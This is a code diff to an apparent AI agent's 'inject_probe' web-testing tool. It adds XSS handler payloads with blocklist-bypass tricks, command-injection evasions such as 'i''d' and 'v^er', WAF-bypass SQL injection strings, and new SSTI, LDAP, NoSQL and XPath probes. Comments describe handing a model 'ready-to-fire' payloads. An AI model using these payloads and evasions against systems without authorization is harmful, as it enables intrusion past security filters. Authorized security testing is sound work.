@@ -38,6 +38,29 @@ the tool chooses the payloads (you cannot supply a command or template expressio
 // without executing anything. The agent weaponizes a surviving tag afterwards.
 const XSS_TAGS = ["script", "img", "svg", "body", "style", "details", "a", "marquee", "input", "iframe"]
 
+// Weaponized + filter-bypass battery. Fired only AFTER a tag is seen to survive, so we can tell
+// the agent WHICH full handler payload — including alert/confirm-blacklist bypasses — reflects
+// un-encoded (a ready-to-fire lead). Still REFLECTION only (no JS engine): a raw-reflected handler
+// payload is a strong lead, not a confirmed execution. All benign — no server-side effect.
+// Each entry, given a nonce, returns the payload + a signature regex whose match means the
+// payload's SENSITIVE run (handler + function + nonce) survived RAW (not stripped, not encoded).
+const XSS_WEAPONS: ((n: string) => { payload: string; sig: RegExp })[] = [
+  (n) => ({ payload: `<svg onload=alert(${n})>`, sig: new RegExp(`onload=alert\\(${n}`, "i") }),
+  (n) => ({ payload: `<svg onload=confirm(${n})>`, sig: new RegExp(`onload=confirm\\(${n}`, "i") }),
+  (n) => ({ payload: `<svg onload=print(${n})>`, sig: new RegExp(`onload=print\\(${n}`, "i") }), // alt fn — bypasses alert/confirm blocklists
+  (n) => ({ payload: `<svg onload=prompt(${n})>`, sig: new RegExp(`onload=prompt\\(${n}`, "i") }),
+  (n) => ({ payload: `<svg onload=\\u0061lert(${n})>`, sig: new RegExp(`onload=\\\\u0061lert\\(${n}`, "i") }), // unicode-escape bypass
+  (n) => ({ payload: `<svg onload=top['al'+'ert'](${n})>`, sig: new RegExp(`top\\['al'\\+'ert'\\]\\(${n}`, "i") }), // concat bypass
+  (n) => ({ payload: `<svg onload=(alert)(${n})>`, sig: new RegExp(`\\(alert\\)\\(${n}`, "i") }), // paren-wrap bypass
+  (n) => ({ payload: `<img src=x onerror=alert(${n})>`, sig: new RegExp(`onerror=alert\\(${n}`, "i") }),
+  (n) => ({ payload: `<img src=x onerror=print(${n})>`, sig: new RegExp(`onerror=print\\(${n}`, "i") }),
+  (n) => ({ payload: `<body onpageshow=alert(${n})>`, sig: new RegExp(`onpageshow=alert\\(${n}`, "i") }),
+  (n) => ({ payload: `<details open ontoggle=alert(${n})>`, sig: new RegExp(`ontoggle=alert\\(${n}`, "i") }),
+  (n) => ({ payload: `<marquee onstart=alert(${n})>`, sig: new RegExp(`onstart=alert\\(${n}`, "i") }),
+  (n) => ({ payload: `<input autofocus onfocus=alert(${n})>`, sig: new RegExp(`onfocus=alert\\(${n}`, "i") }),
+  (n) => ({ payload: `<a href=javascript:alert(${n})>x</a>`, sig: new RegExp(`href=javascript:alert\\(${n}`, "i") }),
+]
+
 const XSS_NOT_TESTED = [
   "stored/second-order XSS (fires on a different render request)",
   "DOM-based XSS (needs a JS engine)",
@@ -62,6 +85,10 @@ const SSTI_SYNTAXES: { name: string; wrap: (e: string) => string }[] = [
   { name: "#{ }", wrap: (e) => `#{${e}}` }, // Ruby/Slim, JSF EL
   { name: "<%= %>", wrap: (e) => `<%= ${e} %>` }, // ERB, EJS, ASP
   { name: "@( )", wrap: (e) => `@(${e})` }, // Razor
+  { name: "%{ }", wrap: (e) => `%{${e}}` }, // OGNL / Struts2
+  { name: "*{ }", wrap: (e) => `*{${e}}` }, // Thymeleaf selection expr
+  { name: "[[${ }]]", wrap: (e) => `[[\${${e}}]]` }, // Thymeleaf inline eval (bypasses ${ } filters)
+  { name: "{{= }}", wrap: (e) => `{{=${e}}}` }, // Underscore / doT / EJS-alt
 ]
 const SSTI_NOT_TESTED = [
   "blind/out-of-band SSTI (evaluated result not reflected in the response)",
@@ -76,7 +103,10 @@ const SSTI_NOT_TESTED = [
 // file read/write, NO redirects, NO time-delay (sleep) — that line is detection⇄exploitation.
 const CMD_PROBES: { cmd: string; marker: RegExp; os: string }[] = [
   { cmd: "id", marker: /\buid=\d+\(/i, os: "unix" }, // uid=0(root) gid=0(root) …
+  { cmd: "i''d", marker: /\buid=\d+\(/i, os: "unix" }, // quote-insertion evasion — shell strips '' → runs id
+  { cmd: "i\\d", marker: /\buid=\d+\(/i, os: "unix" }, // backslash evasion — shell strips \ → runs id
   { cmd: "ver", marker: /windows \[version/i, os: "windows" }, // Microsoft Windows [Version …]
+  { cmd: "v^er", marker: /windows \[version/i, os: "windows" }, // caret evasion — cmd.exe strips ^ → runs ver
 ]
 const CMD_SEPARATORS: { name: string; wrap: (c: string) => string }[] = [
   { name: ";", wrap: (c) => `;${c}` },
@@ -108,13 +138,16 @@ interface ErrSigClass {
 }
 const ERRSIG: Record<"sqli" | "nosql" | "ldap" | "xpath", ErrSigClass> = {
   sqli: {
-    payloads: ["'", '"', "`", "\\", "')", '")', "'))", `'"`, "'--", "'#", "'/*", "1'", '1"'],
+    // breakers + filter-bypass forms (comment/case/escape) — still ERROR-only, no OR/stacked/write.
+    payloads: ["'", '"', "`", "\\", "')", '")', "'))", `'"`, "'--", "'#", "'/*", "1'", '1"', "'/**/", "'-- -", "'/*!50000*/", "\\'"],
     boolPairs: [
       { t: "' AND '1'='1", f: "' AND '1'='2" },
       { t: '" AND "1"="1', f: '" AND "1"="2' },
       { t: "') AND ('1'='1", f: "') AND ('1'='2" },
       { t: "' AND 1=1-- -", f: "' AND 1=2-- -" },
       { t: "1 AND 1=1", f: "1 AND 1=2" },
+      { t: "'/**/AND/**/'1'='1", f: "'/**/AND/**/'1'='2" }, // comment-whitespace WAF bypass (AND only)
+      { t: "' AnD '1'='1", f: "' AnD '1'='2" }, // keyword-case bypass (AND only)
     ],
     signatures:
       /SQL syntax|mysqli?_|you have an error in your sql|unclosed quotation|quoted string not properly terminated|ORA-\d{5}|PLS-\d|SQLSTATE|PostgreSQL.*(ERROR|error)|SQLite(3)?::|sqlite_|syntax error at or near|Microsoft OLE DB|ODBC.*Driver|Incorrect syntax near|Unclosed quotation mark|Warning.*\bpg_|Warning.*\bmysqli?/i,
@@ -122,19 +155,19 @@ const ERRSIG: Record<"sqli" | "nosql" | "ldap" | "xpath", ErrSigClass> = {
   nosql: {
     // malformed value / type-confusion that a Mongo/BSON layer surfaces as an error — no
     // operator-injection ([$ne]/[$gt]) here (deferred: it can change match semantics = widen).
-    payloads: ["'", '"', "\\", "[", "]", "{", "}", "'\"", '{"a":', "']", "'}", "%00"],
+    payloads: ["'", '"', "\\", "[", "]", "{", "}", "'\"", '{"a":', "']", "'}", "%00", "\\\"", "{[", "',", "NaN", "'\\"],
     signatures:
       /MongoError|MongoServerError|BSONError|BSONTypeError|E11000|CastError|failed to parse|unexpected token.*(json|in json)|SyntaxError:.*JSON|\$where|Mongoose|couldn't parse/i,
   },
   ldap: {
     // LDAP filter metacharacters that break the filter → server surfaces a filter/DN error.
-    payloads: ["(", ")", "*", "\\", ")(", "*)", "(&", "(|", "))", "*()", "\\29", "\\28"],
+    payloads: ["(", ")", "*", "\\", ")(", "*)", "(&", "(|", "))", "*()", "\\29", "\\28", "\\2a", "\\5c", "()", "&", "|"],
     signatures:
       /LDAP.*(error|syntax|filter)|invalid DN|bad search filter|(javax|com)\.naming|invalid filter|Protocol error|InvalidSearchFilter|ldap_search/i,
   },
   xpath: {
     // XPath is a read-only query language (no write-widening risk); breakers elicit parser errors.
-    payloads: ["'", '"', ")", "(", "]", "[", "//", "*", "')", '")', "' and '1'='2", "count("],
+    payloads: ["'", '"', ")", "(", "]", "[", "//", "*", "')", '")', "' and '1'='2", "count(", "']", "'))", "concat(", "string("],
     signatures:
       /XPath|XPathException|xmlXPathEval|SyntaxError.*xpath|unclosed token|Invalid (expression|predicate)|xpath.*(syntax|error)|MS\.Internal\.Xml/i,
   },
@@ -541,6 +574,7 @@ interface PointObservation {
   reflection_snippet?: string // excerpt of the response around the reflected marker (shows the sink context)
   context?: string // html-body | attribute-* | javascript | tag-name — how to weaponize
   surviving_tags: string[] // tags that reflected RAW (un-stripped, un-encoded) — a fact, not a verdict
+  weaponized: string[] // full handler payloads (incl. alert/confirm-blacklist bypasses) that reflected RAW — ready leads
   breakout?: string // a context-breakout sequence ("><svg…, '><svg…, </script>…) that reflected RAW
   block_signal?: string
   blocked: boolean
@@ -559,6 +593,7 @@ async function probeXssPoint(
     marker_reflected: false,
     marker_html_encoded: null,
     surviving_tags: [],
+    weaponized: [],
     blocked: false,
   }
   const sleep = (ms: number) => (ms ? new Promise((res) => setTimeout(res, ms)) : Promise.resolve())
@@ -605,6 +640,20 @@ async function probeXssPoint(
     const tn = nonce()
     const res = await send(r, applyPayload(r, point, mk(tn)), abort, budget)
     if (!("error" in res) && !looksBlocked(res.status) && new RegExp(`<svg\\b[^>]*${tn}`, "i").test(res.text)) obs.breakout = mk(tn)
+  }
+  // 4) weaponized + filter-bypass battery — only if a tag already survived (weaponization plausible).
+  //    Reports which FULL handler payload (incl. alert/confirm-blocklist bypasses) reflects RAW, so a
+  //    weak model gets a ready-to-fire payload instead of guessing the evasion itself.
+  if (obs.surviving_tags.length > 0) {
+    for (const make of XSS_WEAPONS) {
+      if (abort.aborted || budget.sent >= budget.max) break
+      const wn = nonce()
+      const { payload, sig } = make(wn)
+      const res = await send(r, applyPayload(r, point, payload), abort, budget)
+      if ("error" in res || looksBlocked(res.status)) continue
+      if (sig.test(res.text)) obs.weaponized.push(payload.replace(wn, "'XSS'")) // ready-to-fire (nonce → 'XSS')
+      await sleep(delayMs)
+    }
   }
   return obs
 }
@@ -1002,7 +1051,9 @@ export const InjectProbeTool = Tool.define("inject_probe", {
           const o = await probeXssPoint(resolved, point, ctx.abort, DELAY, budget)
           classObs.push(o)
           markBlocked(o, cls)
-          if (o.surviving_tags.length > 0)
+          if (o.weaponized.length > 0)
+            leads.push(`xss @ ${o.point}: READY payload(s) reflected un-encoded (copy & fire, filter-bypass already applied): ${o.weaponized.slice(0, 4).join("  |  ")} — confirm execution.`)
+          else if (o.surviving_tags.length > 0)
             leads.push(`xss @ ${o.point}: tag(s) [${o.surviving_tags.join(", ")}] reflected un-encoded${o.context ? ` in ${o.context} context` : ""} — weaponize one (event handler) and confirm.`)
         } else if (cls === "ssti") {
           const o = await probeSstiPoint(resolved, point, ctx.abort, DELAY, budget)
